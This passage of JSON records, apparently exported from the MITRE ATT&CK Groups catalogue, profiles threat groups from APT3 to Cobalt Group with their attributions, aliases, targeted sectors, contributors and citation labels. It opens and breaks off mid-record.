SUNSPOT Implant January 2021),(Citation: Microsoft 365 Defender Solorigate),(Citation: Volexity PowerDuke November 2016),(Citation: Mandiant APT29 Trello),(Citation: FireEye APT29 Domain Fronting),(Citation: NCSC APT29 July 2020),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: ANSSI Nobelium Phishing December 2021),(Citation: MagicWeb),(Citation: MSTIC NOBELIUM May 2021),(Citation: SentinelOne NobleBaron June 2021),(Citation: Secureworks IRON RITUAL USAID Phish May 2021),(Citation: Mandiant No Easy Breach),(Citation: ESET T3 Threat Report 2021),(Citation: MSTIC Nobelium Oct 2021),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: Mandiant Remediation and Hardening Strategies for Microsoft 365),(Citation: MSRC Nobelium June 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: PWC WellMess July 2020),(Citation: F-Secure The Dukes),(Citation: PWC WellMess C2 August 2020),(Citation: FireEye APT29),(Citation: Symantec Seaduke 2015),(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe),(Citation: Mandiant UNC2452 APT29 April 2022),(Citation: UK NSCS Russia SolarWinds April 2021),(Citation: NSA Joint Advisory SVR SolarWinds April 2021),(Citation: ESET Dukes October 2019)"}
{"ID":"G0022","name":"APT3","description":"[APT3](https://attack.mitre.org/groups/G0022) is a China-based threat group that researchers have attributed to China's Ministry of State Security.(Citation: FireEye Clandestine Wolf)(Citation: Recorded Future APT3 May 2017) This group is responsible for the campaigns known as Operation Clandestine Fox, Operation Clandestine Wolf, and Operation Double Tap.(Citation: FireEye Clandestine Wolf)(Citation: FireEye Operation Double Tap) As of June 2015, the group appears to have shifted from targeting primarily US victims to primarily political organizations in Hong Kong.(Citation: Symantec Buckeye)\n\nIn 2017, MITRE developed an APT3 Adversary Emulation Plan.(Citation: APT3 Adversary Emulation Plan)","url":"https://attack.mitre.org/groups/G0022","created":"31 May 2017","last modified":"01 October 2021","version":"1.4","contributors":"Patrick Sungbahadoor","associated groups":"Buckeye, Gothic Panda, Pirpi, TG-0110, Threat Group-0110, UPS Team","associated groups citations":"(Citation: Symantec Buckeye), (Citation: PWC Pirpi Scanbox) (Citation: Recorded Future APT3 May 2017) (Citation: Symantec Buckeye), (Citation: PWC Pirpi Scanbox), (Citation: Recorded Future APT3 May 2017) (Citation: Symantec Buckeye), (Citation: Recorded Future APT3 May 2017) (Citation: Symantec Buckeye), (Citation: FireEye Clandestine Wolf) (Citation: Recorded Future APT3 May 2017) (Citation: Symantec Buckeye)","relationship citations":"(Citation: FireEye Clandestine Fox Part 2),(Citation: Symantec Buckeye),(Citation: FireEye Clandestine Wolf),(Citation: FireEye Operation Double Tap),(Citation: FireEye Clandestine Wolf),(Citation: aptsim),(Citation: FireEye Clandestine Fox),(Citation: Twitter Cglyer Status Update APT3 eml),(Citation: FireEye Operation Double Tap),(Citation: FireEye Clandestine Fox Part 2),(Citation: Symantec Buckeye),(Citation: APT3 Adversary Emulation Plan),(Citation: evolution of pirpi),"}
{"ID":"G0013","name":"APT30","description":"[APT30](https://attack.mitre.org/groups/G0013) is a threat group suspected to be associated with the Chinese government. While [Naikon](https://attack.mitre.org/groups/G0019) shares some characteristics with [APT30](https://attack.mitre.org/groups/G0013), the two groups do not appear to be exact matches.(Citation: FireEye APT30)(Citation: Baumgartner Golovkin Naikon 2015)","url":"https://attack.mitre.org/groups/G0013","created":"31 May 2017","last modified":"29 July 2020","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: FireEye APT30),(Citation: FireEye APT30),"}
{"ID":"G0050","name":"APT32","description":"[APT32](https://attack.mitre.org/groups/G0050) is a suspected Vietnam-based threat group that has been active since at least 2014. The group has targeted multiple private sector industries as well as foreign governments, dissidents, and journalists with a strong focus on Southeast Asian countries like Vietnam, the Philippines, Laos, and Cambodia. They have extensively used strategic web compromises to compromise victims.(Citation: FireEye APT32 May 2017)(Citation: Volexity OceanLotus Nov 2017)(Citation: ESET OceanLotus)","url":"https://attack.mitre.org/groups/G0050","created":"14 December 2017","last modified":"21 March 2023","version":"2.6","contributors":"Romain Dumont, ESET","associated groups":"APT-C-00, OceanLotus, SeaLotus","associated groups citations":"(Citation: ESET OceanLotus)(Citation: Cybereason Oceanlotus May 2017)(Citation: ESET OceanLotus Mar 2019)(Citation: Amnesty Intl. Ocean Lotus February 2021), (Citation: FireEye APT32 May 2017)(Citation: Volexity OceanLotus Nov 2017)(Citation: Cybereason Oceanlotus May 2017)(Citation: ESET OceanLotus Mar 2019)(Citation: Amnesty Intl. Ocean Lotus February 2021), (Citation: Cybereason Oceanlotus May 2017)","relationship citations":"(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Volexity OceanLotus Nov 2017),(Citation: FireEye APT32 May 2017),(Citation: TrendMicro MacOS April 2018),(Citation: Volexity Ocean Lotus November 2020),(Citation: Cybereason Oceanlotus May 2017),(Citation: Unit 42 KerrDown February 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: Twitter ItsReallyNick Status Update APT32 PubPrn),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Volexity OceanLotus Nov 2017),(Citation: Twitter ItsReallyNick APT32 pubprn Masquerade),(Citation: FireEye APT32 May 2017),(Citation: ESET OceanLotus),(Citation: GitHub Invoke-Obfuscation),(Citation: Volexity Ocean Lotus November 2020),(Citation: Cybereason Oceanlotus May 2017),(Citation: ESET OceanLotus macOS April 2019),(Citation: FireEye APT32 April 2020),(Citation: Cybereason Cobalt Kitty 2017),"}
{"ID":"G0064","name":"APT33","description":"[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)","url":"https://attack.mitre.org/groups/G0064","created":"18 April 2018","last modified":"08 March 2023","version":"1.4","contributors":"Dragos  Threat  Intelligence","associated groups":"Elfin, HOLMIUM","associated groups citations":"(Citation: Symantec Elfin Mar 2019), (Citation: Microsoft Holmium June 2020)","relationship citations":"(Citation: FireEye APT33 Webinar Sept 2017),(Citation: Symantec Elfin Mar 2019),(Citation: Microsoft Holmium June 2020),(Citation: FireEye APT33 Guardrail),(Citation: FireEye APT33 Sept 2017),(Citation: FireEye APT33 Webinar Sept 2017),(Citation: Symantec Elfin Mar 2019),(Citation: Microsoft Holmium June 2020),(Citation: FireEye APT33 Guardrail),(Citation: FireEye APT33 Sept 2017),"}
{"ID":"G0067","name":"APT37","description":"[APT37](https://attack.mitre.org/groups/G0067) is a North Korean state-sponsored cyber espionage group that has been active since at least 2012. The group has targeted victims primarily in South Korea, but also in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East. [APT37](https://attack.mitre.org/groups/G0067) has also been linked to the following campaigns between 2016-2018: Operation Daybreak, Operation Erebus, Golden Time, Evil New Year, Are you Happy?, FreeMilk, North Korean Human Rights, and Evil New Year 2018.(Citation: FireEye APT37 Feb 2018)(Citation: Securelist ScarCruft Jun 2016)(Citation: Talos Group123)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.","url":"https://attack.mitre.org/groups/G0067","created":"18 April 2018","last modified":"15 October 2021","version":"2.0","contributors":"Valerii Marchuk, Cybersecurity Help s.r.o.","associated groups":"Group123, InkySquid, Reaper, Richochet Chollima, ScarCruft, TEMP.Reaper","associated groups citations":"(Citation: FireEye APT37 Feb 2018), (Citation: Volexity InkySquid BLUELIGHT August 2021), (Citation: FireEye APT37 Feb 2018), (Citation: CrowdStrike Richochet Chollima September 2021), (Citation: Securelist ScarCruft Jun 2016)(Citation: FireEye APT37 Feb 2018)(Citation: Securelist ScarCruft May 2019), (Citation: FireEye APT37 Feb 2018)","relationship citations":"(Citation: Securelist ScarCruft May 2019),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Talos Group123),(Citation: Talos NavRAT May 2018),(Citation: Unit 42 Nokki Oct 2018),(Citation: FireEye APT37 Feb 2018),(Citation: Securelist ScarCruft May 2019),(Citation: Talos Group123),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Securelist ScarCruft Jun 2016),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: FireEye APT37 Feb 2018),"}
{"ID":"G0082","name":"APT38","description":"[APT38](https://attack.mitre.org/groups/G0082) is a North Korean state-sponsored threat group that specializes in financial cyber operations; it has been attributed to the Reconnaissance General Bureau.(Citation: CISA AA20-239A BeagleBoyz August 2020) Active since at least 2014, [APT38](https://attack.mitre.org/groups/G0082) has targeted banks, financial institutions, casinos, cryptocurrency exchanges, SWIFT system endpoints, and ATMs in at least 38 countries worldwide. Significant operations include the 2016 Bank of Bangladesh heist, during which [APT38](https://attack.mitre.org/groups/G0082) stole $81 million, as well as attacks against Bancomext (2018) and Banco de Chile (2018); some of their attacks have been destructive.(Citation: CISA AA20-239A BeagleBoyz August 2020)(Citation: FireEye APT38 Oct 2018)(Citation: DOJ North Korea Indictment Feb 2021)(Citation: Kaspersky Lazarus Under The Hood Blog 2017)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.","url":"https://attack.mitre.org/groups/G0082","created":"29 January 2019","last modified":"18 January 2022","version":"2.0","contributors":null,"associated groups":"BeagleBoyz, Bluenoroff, NICKEL GLADSTONE, Stardust Chollima","associated groups citations":"(Citation: CISA AA20-239A BeagleBoyz August 2020), (Citation: Kaspersky Lazarus Under The Hood Blog 2017), (Citation: SecureWorks NICKEL GLADSTONE profile Sept 2021), (Citation: CrowdStrike Stardust Chollima Profile April 2018)(Citation: CrowdStrike GTR 2021 June 2021)","relationship citations":"(Citation: FireEye APT38 Oct 2018),(Citation: ESET Lazarus KillDisk April 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FireEye APT38 Oct 2018),(Citation: ESET Lazarus KillDisk April 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Kaspersky Lazarus Under The Hood APR 2017),"}
{"ID":"G0087","name":"APT39","description":"[APT39](https://attack.mitre.org/groups/G0087) is one of several names for cyber espionage activity conducted by the Iranian Ministry of Intelligence and Security (MOIS) through the front company Rana Intelligence Computing since at least 2014. [APT39](https://attack.mitre.org/groups/G0087) has primarily targeted the travel, hospitality, academic, and telecommunications industries in Iran and across Asia, Africa, Europe, and North America to track individuals and entities considered to be a threat by the MOIS.(Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)(Citation: FBI FLASH APT39 September 2020)(Citation: Dept. of Treasury Iran Sanctions September 2020)(Citation: DOJ Iran Indictments September 2020)","url":"https://attack.mitre.org/groups/G0087","created":"19 February 2019","last modified":"02 September 2022","version":"3.1","contributors":null,"associated groups":"Chafer, ITG07, Remix Kitten","associated groups citations":"Activities associated with APT39 largely align with a group publicly referred to as Chafer.(Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)(Citation: Dark Reading APT39 JAN 2019)(Citation: FBI FLASH APT39 September 2020)(Citation: Dept. of Treasury Iran Sanctions September 2020)(Citation: DOJ Iran Indictments September 2020), (Citation: FBI FLASH APT39 September 2020)(Citation: Dept. of Treasury Iran Sanctions September 2020)(Citation: DOJ Iran Indictments September 2020), (Citation: Crowdstrike GTR2020 Mar 2020)","relationship citations":"(Citation: Unit 42 MechaFlounder March 2019),(Citation: FBI FLASH APT39 September 2020),(Citation: Dark Reading APT39 JAN 2019),(Citation: Symantec Chafer February 2018),(Citation: Symantec Chafer Dec 2015),(Citation: Securelist Remexi Jan 2019),(Citation: BitDefender Chafer May 2020),(Citation: FireEye APT39 Jan 2019),(Citation: FBI FLASH APT39 September 2020),(Citation: IBM ITG07 June 2019),(Citation: Symantec Chafer February 2018),(Citation: Symantec Chafer Dec 2015),(Citation: BitDefender Chafer May 2020),(Citation: FireEye APT39 Jan 2019),"}
{"ID":"G0096","name":"APT41","description":"[APT41](https://attack.mitre.org/groups/G0096) is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. Active since at least 2012, [APT41](https://attack.mitre.org/groups/G0096) has been observed targeting healthcare, telecom, technology, and video game industries in 14 countries. [APT41](https://attack.mitre.org/groups/G0096) overlaps at least partially with public reporting on groups including BARIUM and [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)\n","url":"https://attack.mitre.org/groups/G0096","created":"23 September 2019","last modified":"23 March 2023","version":"3.1","contributors":"Kyaw Pyiyt Htet, @KyawPyiytHtet","associated groups":"Wicked Panda","associated groups citations":"(Citation: Crowdstrike GTR2020 Mar 2020)","relationship citations":"(Citation: Group IB APT 41 June 2021),(Citation: Mandiant APT41),(Citation: FireEye APT41 Aug 2019),(Citation: Recorded Future RedEcho Feb 2021),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: FireEye MESSAGETAP October 2019),(Citation: FireEye APT41 March 2020),(Citation: Twitter ItsReallyNick APT41 EK),(Citation: Group IB APT 41 June 2021),(Citation: FireEye APT41 Aug 2019),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: FireEye APT41 March 2020),(Citation: Mandiant APT41)"}
{"ID":"G0130","name":"Ajax Security Team","description":"[Ajax Security Team](https://attack.mitre.org/groups/G0130) is a group that has been active since at least 2010 and believed to be operating out of Iran. By 2014 [Ajax Security Team](https://attack.mitre.org/groups/G0130) transitioned from website defacement operations to malware-based cyber espionage campaigns targeting the US defense industrial base and Iranian users of anti-censorship technologies.(Citation: FireEye Operation Saffron Rose 2013)","url":"https://attack.mitre.org/groups/G0130","created":"14 April 2021","last modified":"17 December 2021","version":"1.0","contributors":null,"associated groups":"AjaxTM, Flying Kitten, Operation Saffron Rose, Operation Woolen-Goldfish, Rocket Kitten","associated groups citations":"(Citation: FireEye Operation Saffron Rose 2013), (Citation: CrowdStrike Flying Kitten ), (Citation: FireEye Operation Saffron Rose 2013), Analysis of infrastructure, tools, and modes of operation revealed a potential relationship between [Ajax Security Team](https://attack.mitre.org/groups/G0130) and the campaign Operation Woolen-Goldfish.(Citation: Check Point Rocket Kitten)(Citation: TrendMicro Operation Woolen Goldfish March 2015), Analysis of infrastructure, tools, and modes of operation revealed a potential relationship between [Ajax Security Team](https://attack.mitre.org/groups/G0130) and Rocket Kitten.(Citation: Check Point Rocket Kitten)(Citation: IranThreats Kittens Dec 2017)","relationship citations":"(Citation: Check Point Rocket Kitten),(Citation: Check Point Rocket Kitten),(Citation: FireEye Operation Saffron Rose 2013),"}
{"ID":"G0138","name":"Andariel","description":"[Andariel](https://attack.mitre.org/groups/G0138) is a North Korean state-sponsored threat group that has been active since at least 2009. [Andariel](https://attack.mitre.org/groups/G0138) has primarily focused its operations--which have included destructive attacks--against South Korean government agencies, military organizations, and a variety of domestic companies; they have also conducted cyber financial operations against ATMs, banks, and cryptocurrency exchanges. [Andariel](https://attack.mitre.org/groups/G0138)'s notable activity includes Operation Black Mine, Operation GoldenAxe, and Campaign Rifle.(Citation: FSI Andariel Campaign Rifle July 2017)(Citation: IssueMakersLab Andariel GoldenAxe May 2017)(Citation: AhnLab Andariel Subgroup of Lazarus June 2018)(Citation: TrendMicro New Andariel Tactics July 2018)(Citation: CrowdStrike Silent Chollima Adversary September 2021)\n\n[Andariel](https://attack.mitre.org/groups/G0138) is considered a sub-set of [Lazarus Group](https://attack.mitre.org/groups/G0032), and has been attributed to North Korea's Reconnaissance General Bureau.(Citation: Treasury North Korean Cyber Groups September 2019)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.","url":"https://attack.mitre.org/groups/G0138","created":"29 September 2021","last modified":"30 November 2022","version":"1.0","contributors":"Kyoung-ju Kwak (S2W)","associated groups":"Silent Chollima","associated groups citations":"(Citation: CrowdStrike Silent Chollima Adversary September 2021)","relationship citations":"(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: TrendMicro New Andariel Tactics July 2018),(Citation: FSI Andariel Campaign Rifle July 2017),(Citation: MalwareBytes Lazarus-Andariel Conceals Code April 2021),(Citation: Kaspersky Andariel Ransomware June 2021),(Citation: IssueMakersLab Andariel GoldenAxe May 2017),"}
{"ID":"G1007","name":"Aoqin Dragon","description":"[Aoqin Dragon](https://attack.mitre.org/groups/G1007) is a suspected Chinese cyber espionage threat group that has been active since at least 2013. [Aoqin Dragon](https://attack.mitre.org/groups/G1007) has primarily targeted government, education, and telecommunication organizations in Australia, Cambodia, Hong Kong, Singapore, and Vietnam. Security researchers noted a potential association between [Aoqin Dragon](https://attack.mitre.org/groups/G1007) and UNC94, based on malware, infrastructure, and targets.(Citation: SentinelOne Aoqin Dragon June 2022)","url":"https://attack.mitre.org/groups/G1007","created":"14 July 2022","last modified":"24 October 2022","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: SentinelOne Aoqin Dragon June 2022),"}
{"ID":"G0143","name":"Aquatic Panda","description":"[Aquatic Panda](https://attack.mitre.org/groups/G0143) is a suspected China-based threat group with a dual mission of intelligence collection and industrial espionage. Active since at least May 2020, [Aquatic Panda](https://attack.mitre.org/groups/G0143) has primarily targeted entities in the telecommunications, technology, and government sectors.(Citation: CrowdStrike AQUATIC PANDA December 2021)","url":"https://attack.mitre.org/groups/G0143","created":"18 January 2022","last modified":"21 March 2023","version":"1.1","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; NST Assure Research Team, NetSentries Technologies; Pooja Natarajan, NEC Corporation India","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: CrowdStrike AQUATIC PANDA December 2021),"}
{"ID":"G0001","name":"Axiom","description":"[Axiom](https://attack.mitre.org/groups/G0001) is a suspected Chinese cyber espionage group that has targeted the aerospace, defense, government, manufacturing, and media sectors since at least 2008. Some reporting suggests a degree of overlap between [Axiom](https://attack.mitre.org/groups/G0001) and [Winnti Group](https://attack.mitre.org/groups/G0044) but the two groups appear to be distinct based on differences in reporting on TTPs and targeting.(Citation: Kaspersky Winnti April 2013)(Citation: Kaspersky Winnti June 2015)(Citation: Novetta Winnti April 2015)","url":"https://attack.mitre.org/groups/G0001","created":"31 May 2017","last modified":"20 March 2023","version":"2.0","contributors":null,"associated groups":"Group 72","associated groups citations":"(Citation: Cisco Group 72)","relationship citations":"(Citation: Cisco Group 72),(Citation: Talos ZxShell Oct 2014),(Citation: Novetta-Axiom),(Citation: Cisco Group 72),(Citation: Novetta-Axiom),"}
{"ID":"G1002","name":"BITTER","description":"[BITTER](https://attack.mitre.org/groups/G1002) is a suspected South Asian cyber espionage threat group that has been active since at least 2013. [BITTER](https://attack.mitre.org/groups/G1002) has primarily targeted government, energy, and engineering organizations in Pakistan, China, Bangladesh, and Saudi Arabia.(Citation: Cisco Talos Bitter Bangladesh May 2022)(Citation: Forcepoint BITTER Pakistan Oct 2016)","url":"https://attack.mitre.org/groups/G1002","created":"01 June 2022","last modified":"01 June 2022","version":"1.0","contributors":null,"associated groups":"T-APT-17","associated groups citations":"(Citation: Cisco Talos Bitter Bangladesh May 2022)","relationship citations":"(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Microsoft CVE-2021-1732 Feb 2021),(Citation: DBAPPSecurity BITTER zero-day Feb 2021),(Citation: Forcepoint BITTER Pakistan Oct 2016),"}
{"ID":"G0060","name":"BRONZE BUTLER","description":"[BRONZE BUTLER](https://attack.mitre.org/groups/G0060) is a cyber espionage group with likely Chinese origins that has been active since at least 2008. The group primarily targets Japanese organizations, particularly those in government, biotechnology, electronics manufacturing, and industrial chemistry.(Citation: Trend Micro Daserf Nov 2017)(Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Trend Micro Tick November 2019)","url":"https://attack.mitre.org/groups/G0060","created":"16 January 2018","last modified":"12 October 2021","version":"1.3","contributors":"Trend Micro Incorporated","associated groups":"REDBALDKNIGHT, Tick","associated groups citations":"(Citation: Trend Micro Daserf Nov 2017)(Citation: Trend Micro Tick November 2019), (Citation: Trend Micro Daserf Nov 2017)(Citation: Symantec Tick Apr 2016)(Citation: Trend Micro Tick November 2019)","relationship citations":"(Citation: Symantec Tick Apr 2016),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Trend Micro Tick November 2019),(Citation: Trend Micro Daserf Nov 2017),(Citation: Recorded Future RedEcho Feb 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Trend Micro Tick November 2019),(Citation: Symantec Tick Apr 2016),"}
{"ID":"G0135","name":"BackdoorDiplomacy","description":"[BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) is a cyber espionage threat group that has been active since at least 2017. [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) has targeted Ministries of Foreign Affairs and telecommunication companies in Africa, Europe, the Middle East, and Asia.(Citation: ESET BackdoorDiplomacy Jun 2021)","url":"https://attack.mitre.org/groups/G0135","created":"21 September 2021","last modified":"18 October 2021","version":"1.0","contributors":"Zaw Min Htun, @Z3TAE","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),"}
{"ID":"G0063","name":"BlackOasis","description":"[BlackOasis](https://attack.mitre.org/groups/G0063) is a Middle Eastern threat group that is believed to be a customer of Gamma Group. The group has shown interest in prominent figures in the United Nations, as well as opposition bloggers, activists, regional news correspondents, and think tanks. (Citation: Securelist BlackOasis Oct 2017) (Citation: Securelist APT Trends Q2 2017) A group known by Microsoft as [NEODYMIUM](https://attack.mitre.org/groups/G0055) is reportedly associated closely with [BlackOasis](https://attack.mitre.org/groups/G0063) operations, but evidence that the group names are aliases has not been identified. (Citation: CyberScoop BlackOasis Oct 2017)","url":"https://attack.mitre.org/groups/G0063","created":"18 April 2018","last modified":"17 October 2018","version":"1.0","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: Securelist BlackOasis Oct 2017),"}
{"ID":"G0098","name":"BlackTech","description":"[BlackTech](https://attack.mitre.org/groups/G0098) is a suspected Chinese cyber espionage group that has primarily targeted organizations in East Asia--particularly Taiwan, Japan, and Hong Kong--and the US since at least 2013. [BlackTech](https://attack.mitre.org/groups/G0098) has used a combination of custom malware, dual-use tools, and living off the land tactics to compromise media, construction, engineering, electronics, and financial company networks.(Citation: TrendMicro BlackTech June 2017)(Citation: Symantec Palmerworm Sep 2020)(Citation: Reuters Taiwan BlackTech August 2020)","url":"https://attack.mitre.org/groups/G0098","created":"05 May 2020","last modified":"06 April 2022","version":"2.0","contributors":"Hannah Simes, BT Security; Tatsuya Daitoku, Cyber Defense Institute, Inc.","associated groups":"Palmerworm","associated groups citations":"(Citation: Symantec Palmerworm Sep 2020)(Citation: IronNet BlackTech Oct 2021)","relationship citations":"(Citation: NTT Security Flagpro new December 2021),(Citation: TrendMicro BlackTech June 2017),(Citation: JPCert TSCookie March 2018),(Citation: Symantec Palmerworm Sep 2020),(Citation: Trend Micro Waterbear December 2019),(Citation: JPCert PLEAD Downloader June 2018),(Citation: IronNet BlackTech Oct 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: TrendMicro BlackTech June 2017),(Citation: Symantec Palmerworm Sep 2020),(Citation: Trend Micro Waterbear December 2019),(Citation: ESET PLEAD Malware July 2018),"}
{"ID":"G0108","name":"Blue Mockingbird","description":"[Blue Mockingbird](https://attack.mitre.org/groups/G0108) is a cluster of observed activity involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. The earliest observed Blue Mockingbird tools were created in December 2019.(Citation: RedCanary Mockingbird May 2020)","url":"https://attack.mitre.org/groups/G0108","created":"26 May 2020","last modified":"12 October 2021","version":"1.1","contributors":"Tony Lambert, Red Canary","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: RedCanary Mockingbird May 2020),(Citation: RedCanary Mockingbird May 2020),"}
{"ID":"G1012","name":"CURIUM","description":"[CURIUM](https://attack.mitre.org/groups/G1012) is an Iranian threat group first reported in November 2021 that has invested in building a relationship with potential targets via social media over a period of months to establish trust and confidence before sending malware. Security researchers note [CURIUM](https://attack.mitre.org/groups/G1012) has demonstrated great patience and persistence by chatting with potential targets daily and sending benign files to help lower their security consciousness.(Citation: Microsoft Iranian Threat Actor Trends November 2021)","url":"https://attack.mitre.org/groups/G1012","created":"13 January 2023","last modified":"12 April 2023","version":"1.0","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: Microsoft Iranian Threat Actor Trends November 2021),"}
{"ID":"G0008","name":"Carbanak","description":"[Carbanak](https://attack.mitre.org/groups/G0008) is a cybercriminal group that has used [Carbanak](https://attack.mitre.org/software/S0030) malware to target financial institutions since at least 2013. [Carbanak](https://attack.mitre.org/groups/G0008) may be linked to groups tracked separately as [Cobalt Group](https://attack.mitre.org/groups/G0080) and [FIN7](https://attack.mitre.org/groups/G0046) that have also used [Carbanak](https://attack.mitre.org/software/S0030) malware.(Citation: Kaspersky Carbanak)(Citation: FireEye FIN7 April 2017)(Citation: Europol Cobalt Mar 2018)(Citation: Secureworks GOLD NIAGARA Threat Profile)(Citation: Secureworks GOLD KINGSWOOD Threat Profile)","url":"https://attack.mitre.org/groups/G0008","created":"31 May 2017","last modified":"18 October 2021","version":"2.0","contributors":"Anastasios Pingios","associated groups":"Anunak","associated groups citations":"(Citation: Fox-It Anunak Feb 2015)","relationship citations":"(Citation: Kaspersky Carbanak),(Citation: Group-IB Anunak),(Citation: Group-IB Anunak),(Citation: Kaspersky Carbanak),(Citation: Forcepoint Carbanak Google C2),"}
{"ID":"G0114","name":"Chimera","description":"[Chimera](https://attack.mitre.org/groups/G0114) is a suspected China-based threat group that has been active since at least 2018 targeting the semiconductor industry in Taiwan as well as data from the airline industry.(Citation: Cycraft Chimera April 2020)(Citation: NCC Group Chimera January 2021)","url":"https://attack.mitre.org/groups/G0114","created":"24 August 2020","last modified":"22 March 2023","version":"2.2","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: NCC Group Chimera January 2021),(Citation: Cycraft Chimera April 2020),(Citation: NCC Group Chimera January 2021),(Citation: Cycraft Chimera April 2020),"}
{"ID":"G0003","name":"Cleaver","description":"[Cleaver](https://attack.mitre.org/groups/G0003) is a threat group that has been attributed to Iranian actors and is responsible for activity tracked as Operation Cleaver. (Citation: Cylance Cleaver) Strong circumstantial evidence suggests Cleaver is linked to Threat Group 2889 (TG-2889). (Citation: Dell Threat Group 2889)","url":"https://attack.mitre.org/groups/G0003","created":"31 May 2017","last modified":"22 July 2022","version":"1.3","contributors":null,"associated groups":"TG-2889, Threat Group 2889","associated groups citations":"(Citation: Dell Threat Group 2889), (Citation: Dell Threat Group 2889)","relationship citations":"(Citation: Cylance Cleaver),(Citation: Cylance Cleaver),(Citation: Dell Threat Group 2889),"}
{"ID":"G0080","name":"Cobalt Group","description":"[Cobalt Group](https://attack.mitre.org/groups/G0080) is a financially motivated threat group that has primarily targeted financial institutions since at least 2016. The group has conducted intrusions to steal money via targeting ATM systems, card processing, payment systems and SWIFT systems. [Cobalt Group](https://attack.mitre.org/groups/G0080) has mainly targeted banks in Eastern Europe, Central Asia, and Southeast Asia. One of the alleged leaders was arrested in Spain in early 2018, but the group still appears to be active. The group has been known to target organizations in order to use their access to then compromise additional victims.(Citation: Talos Cobalt Group July 2018)(Citation: PTSecurity Cobalt Group Aug 2017)(Citation: PTSecurity Cobalt Dec 2016)(Citation: Group IB Cobalt Aug 2017)(Citation: Proofpoint Cobalt June 2017)(Citation: RiskIQ Cobalt Nov 2017)(Citation: RiskIQ Cobalt Jan 2018) Reporting indicates there may be links between [Cobalt Group](https://attack.mitre.org/groups/G0080) and both the malware [Carbanak](https://attack.mitre.org/software/S0030) and the group [Carbanak](https://attack.mitre.org/groups/G0008).(Citation: Europol Cobalt Mar 2018)","url":"https://attack.mitre.org/groups/G0080","created":"17 October 2018","last modified":"22 March 2023","version":"2.1","contributors":null,"associated groups":"Cobalt Gang, Cobalt Spider, GOLD KINGSWOOD","associated groups citations":"(Citation: Talos Cobalt Group July 2018) (Citation: Crowdstrike Global Threat Report Feb 2018)(Citation: Morphisec Cobalt Gang Oct 2018), (Citation: Crowdstrike Global Threat Report Feb 2018), (Citation: Secureworks GOLD KINGSWOOD September 2018)","relationship citations":"(Citation: Proofpoint Cobalt June 2017),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Talos Cobalt Group July 2018),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Crowdstrike Global Threat Report Feb 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: RiskIQ Cobalt Nov 2017),(Citation: Group IB Cobalt Aug 2017),(Citation: RiskIQ Cobalt Jan 2018),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Morphisec Cobalt 